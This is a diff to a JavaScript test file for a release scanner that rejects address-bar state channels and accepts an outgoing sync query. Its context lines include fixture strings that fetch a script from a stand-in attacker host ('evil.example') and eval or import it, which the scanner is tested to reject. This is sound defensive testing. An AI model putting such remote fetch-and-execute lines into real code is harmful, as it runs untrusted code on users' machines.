@@ -145,6 +145,37 @@ describe("production release scanner", () => {
   });
 
   it.each([
+    ["location.search", 'const filter = new URL(location.search, "http://x").search;'],
+    ["location.hash", "const view = location.hash.slice(1);"],
+    ["history.pushState", 'history.pushState(null, "", "/budget/january");'],
+    ["history.replaceState", 'history.replaceState({ amount: 1200 }, "", "/spent");'],
+  ])("rejects the address bar as a state channel: %s", (_label, contents) => {
+    const fixture = createScanFixture();
+    write(join(fixture.dist, "assets/router-abc123.js"), contents);
+
+    const result = runScan(fixture);
+
+    expect(result.status).not.toBe(0);
+    expect(result.stderr).toContain(
+      "URL state channel found in assets/router-abc123.js",
+    );
+  });
+
+  it("accepts a query string built for an outgoing sync request", () => {
+    const fixture = createScanFixture();
+    write(
+      join(fixture.dist, "assets/sync-transport-abc123.js"),
+      'const query = new URLSearchParams({ after: cursor, keyEpoch: "3", limit: "200" });' +
+        ' fetch(`${serverOrigin}/journal?${query.toString()}`);',
+    );
+
+    const result = runScan(fixture);
+
+    expect(result.status, result.stderr).toBe(0);
+    expect(result.stdout).toContain("Release scan passed");
+  });
+
+  it.each([
     'fetch("https://evil.example/payload.js").then((response) => response.text()).then(eval);',
     'import("https://evil.example/payload.js");',
   ])("rejects remote executable acquisition: %s", (contents) => {
